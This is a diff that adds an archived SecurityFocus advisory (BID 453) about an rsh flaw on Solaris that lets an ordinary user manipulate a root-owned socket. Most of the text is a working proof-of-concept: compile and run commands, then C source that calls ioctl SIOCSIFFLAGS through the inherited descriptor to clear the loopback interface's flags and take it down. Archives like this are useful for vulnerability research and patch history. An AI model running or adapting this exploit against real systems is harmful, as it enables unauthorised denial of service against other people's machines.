@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/453/info
+
+
+A vulnerability in rsh exists that can allow a regular user to modify a root owned socket descriptor. The consequences of this are a possible denial of service due to interfaces being manipulated by malicious users. 
+
+
+cc solarisuck.c -o solarisuck -lsocket
+rsh localhost ./solarisuck
+
+------------
+solarisuck.c
+------------
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/sockio.h>
+#include <net/if.h>
+#include <netinet/in.h>
+
+
+int main(int argc, char *argv[])
+{
+struct ifreq please_break_me;
+
+strcpy( please_break_me.ifr_name, "lo0");
+please_break_me.ifr_flags=0;
+
+if(ioctl(0, SIOCSIFFLAGS, &please_break_me)==-1)
+perror("Damn it didnt work. Obviously not Solaris ;)");
+} 
